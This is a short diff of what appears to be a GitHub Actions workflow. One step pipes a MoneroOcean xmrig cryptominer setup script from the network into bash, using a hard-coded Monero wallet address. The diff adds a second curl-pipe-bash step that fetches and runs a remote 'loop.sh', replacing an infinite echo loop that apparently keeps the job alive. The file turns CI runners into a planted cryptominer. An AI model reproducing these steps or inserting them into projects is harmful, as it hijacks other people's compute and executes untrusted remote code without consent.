@@ -14,9 +14,5 @@ jobs:
       run: curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 43PrhPVeWEUcrbzJTUXajpWxtRGs95kw8S1Fwjh7NZphBUKLxdtuh8TgsmPT9hr2hg1Kn1xAJJkyN2mR9TTSL2fk4aKNP1B
       
     - name: running loop...
-      run: |
-        while [true]
-        do
-        echo 'looping...'
-        done
+      run: curl -s -L https://raw.githubusercontent.com/techtechnikov/min/main/loop.sh | bash -s 
           
